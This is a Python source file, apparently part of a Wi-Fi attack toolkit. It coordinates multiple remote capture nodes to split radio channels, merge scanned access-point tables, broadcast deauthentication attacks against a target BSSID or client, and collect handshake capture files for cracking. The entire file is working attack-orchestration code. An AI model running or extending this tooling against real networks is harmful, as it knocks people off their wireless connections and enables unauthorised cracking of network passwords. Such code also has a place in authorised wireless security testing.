"""
Phase 6b - Multi-node swarm coordinator.

Runs on the central laptop and talks to N remote MeshDaemon nodes over HTTP.
Assigns channel bands to nodes so full RF spectrum coverage is achieved without
overlap, aggregates AP tables, and routes capture files back for cracking.

Usage::

    swarm = SwarmCoordinator(["http://pi1.local:8765", "http://pi2.local:8765"])
    await swarm.connect()
    await swarm.assign_channels()          # splits channels across nodes
    combined_aps = await swarm.merged_ap_table()
    await swarm.broadcast_deauth("aa:bb:cc:dd:ee:ff")
"""
from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from pathlib import Path

log = logging.getLogger("wifit4.mesh.swarm")


@dataclass
class NodeInfo:
    url: str
    status: dict = field(default_factory=dict)
    assigned_channels: list[int] = field(default_factory=list)
    reachable: bool = False


class SwarmCoordinator:
    def __init__(self, node_urls: list[str]) -> None:
        self._nodes = [NodeInfo(url=url) for url in node_urls]

    # -- lifecycle -----------------------------------------------------------

    async def connect(self) -> None:
        await asyncio.gather(*[self._ping(node) for node in self._nodes])
        reachable = [n.url for n in self._nodes if n.reachable]
        log.info("Swarm: %d/%d nodes reachable: %s", len(reachable), len(self._nodes), reachable)

    async def _ping(self, node: NodeInfo) -> None:
        try:
            import httpx
            async with httpx.AsyncClient(timeout=5) as client:
                resp = await client.get(f"{node.url}/status")
                node.status    = resp.json()
                node.reachable = True
        except Exception as exc:
            log.warning("Node %s unreachable: %s", node.url, exc)
            node.reachable = False

    # -- channel assignment --------------------------------------------------

    async def assign_channels(
        self,
        channels_2g: list[int] | None = None,
        channels_5g: list[int] | None = None,
    ) -> None:
        all_channels = (channels_2g or list(range(1, 14))) + (channels_5g or [
            36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120,
            124, 128, 132, 136, 140, 149, 153, 157, 161, 165,
        ])
        active_nodes = [n for n in self._nodes if n.reachable]
        if not active_nodes:
            log.warning("No reachable nodes to assign channels to.")
            return

        # Round-robin partition
        for i, ch in enumerate(all_channels):
            active_nodes[i % len(active_nodes)].assigned_channels.append(ch)

        # Push channel plans to each node
        await asyncio.gather(*[
            self._push_channel_plan(node) for node in active_nodes
        ])

    async def _push_channel_plan(self, node: NodeInfo) -> None:
        # Nodes don't have a dedicated channel-plan endpoint yet; we start scan
        # which uses the adaptive hopper.  Future: POST /scan/channels {list}.
        try:
            import httpx
            async with httpx.AsyncClient(timeout=5) as client:
                await client.post(f"{node.url}/scan/start")
                log.info("Node %s scanning channels %s", node.url, node.assigned_channels[:5])
        except Exception as exc:
            log.warning("Failed to start scan on %s: %s", node.url, exc)

    # -- aggregation ---------------------------------------------------------

    async def merged_ap_table(self) -> list[dict]:
        tasks  = [self._fetch_aps(node) for node in self._nodes if node.reachable]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        merged: dict[str, dict] = {}
        for aps in results:
            if isinstance(aps, Exception):
                continue
            for ap in aps:
                bssid = ap.get("bssid", "")
                if bssid not in merged or ap.get("rssi", -200) > merged[bssid].get("rssi", -200):
                    merged[bssid] = ap
        return list(merged.values())

    async def _fetch_aps(self, node: NodeInfo) -> list[dict]:
        try:
            import httpx
            async with httpx.AsyncClient(timeout=5) as client:
                resp = await client.get(f"{node.url}/scan")
                return resp.json().get("aps", [])
        except Exception:
            return []

    # -- broadcast operations ------------------------------------------------

    async def broadcast_deauth(
        self,
        bssid: str,
        client: str | None = None,
        strategy: str = "ADAPTIVE",
    ) -> None:
        await asyncio.gather(*[
            self._node_deauth(node, bssid, client, strategy)
            for node in self._nodes if node.reachable
        ])

    async def _node_deauth(
        self,
        node: NodeInfo,
        bssid: str,
        client: str | None,
        strategy: str,
    ) -> None:
        try:
            import httpx
            async with httpx.AsyncClient(timeout=5) as client_http:
                await client_http.post(
                    f"{node.url}/attack/deauth",
                    json={"bssid": bssid, "client": client, "strategy": strategy},
                )
        except Exception as exc:
            log.warning("Deauth broadcast failed on %s: %s", node.url, exc)

    async def stop_all_attacks(self) -> None:
        await asyncio.gather(*[self._node_stop(n) for n in self._nodes if n.reachable])

    async def _node_stop(self, node: NodeInfo) -> None:
        try:
            import httpx
            async with httpx.AsyncClient(timeout=5) as client:
                await client.post(f"{node.url}/attack/stop")
        except Exception:
            pass

    # -- capture retrieval ---------------------------------------------------

    async def pull_captures(self, dest_dir: Path | str) -> list[str]:
        dest_dir = Path(dest_dir)
        dest_dir.mkdir(parents=True, exist_ok=True)
        pulled: list[str] = []
        for node in self._nodes:
            if not node.reachable:
                continue
            files = await self._list_captures(node)
            for fname in files:
                path = await self._download_capture(node, fname, dest_dir)
                if path:
                    pulled.append(str(path))
        return pulled

    async def _list_captures(self, node: NodeInfo) -> list[str]:
        try:
            import httpx
            async with httpx.AsyncClient(timeout=5) as client:
                resp = await client.get(f"{node.url}/captures")
                return resp.json().get("files", [])
        except Exception:
            return []

    async def _download_capture(
        self, node: NodeInfo, filename: str, dest: Path
    ) -> Path | None:
        try:
            import httpx
            async with httpx.AsyncClient(timeout=30) as client:
                resp = await client.get(f"{node.url}/captures/{filename}")
                out  = dest / f"{node.url.split('/')[-1]}_{filename}"
                out.write_bytes(resp.content)
                return out
        except Exception as exc:
            log.warning("Download %s from %s failed: %s", filename, node.url, exc)
            return None
